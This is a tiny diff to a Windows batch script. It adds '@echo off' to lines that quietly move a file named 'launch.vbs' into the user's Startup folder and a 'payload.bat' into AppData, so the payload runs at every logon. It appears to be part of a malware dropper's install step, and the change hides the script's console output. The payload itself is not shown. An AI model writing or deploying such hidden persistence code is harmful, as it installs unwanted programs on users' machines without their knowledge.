@@ -1,3 +1,4 @@
+@echo off
 move "payload\launch.vbs" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" >nul
 move "payload\payload.bat"  "C:\users\%username%\AppData" >nul
 timeout 1 >nul
